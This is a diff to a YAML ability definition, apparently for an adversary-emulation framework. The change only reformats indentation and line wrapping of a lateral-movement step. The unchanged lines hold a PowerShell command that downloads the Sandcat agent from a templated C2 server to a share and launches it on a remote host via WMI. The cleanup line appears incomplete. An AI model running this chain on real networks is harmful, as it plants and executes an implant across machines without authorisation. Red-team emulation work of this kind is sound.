@@ -2,13 +2,13 @@
   description: Copy Sandcat file using PowerShell
   name: Copy Sandcat File using Powershell
   tactic: lateral-movement
-    technique:
-      attack_id: T1105
-      name: Remote File Copy
+  technique:
+    attack_id: T1105
+    name: Remote File Copy
   platforms:
     windows:
       psh:
-        command: |-
+        command: |
           $server="#{server}";
           $sharePath="#{share}";
           Set-Location $sharePath;$url="$($server)/file/download";
@@ -19,8 +19,7 @@
           $startServer="$($sharePath)$name.exe -server $($server) ";Invoke-Command
           -ScriptBlock {Param([string]$startServer, $sharePath, $name, $server)  Invoke-WmiMethod
           -Class Win32_Process -Name Create -ArgumentList "$($sharePath)$name.exe
-          -server $server -v" } -ComputerName #{remote.host.name} -ArgumentList $startServer,
-          $sharePath, $name, $server
+          -server $server -v" } -ComputerName #{remote.host.name} -ArgumentList $startServer, $sharePath, $name, $server
         cleanup: del sandcat.go-windows; Invoke-Command -ComputerName
         payloads:
         - sandcat.go-windows
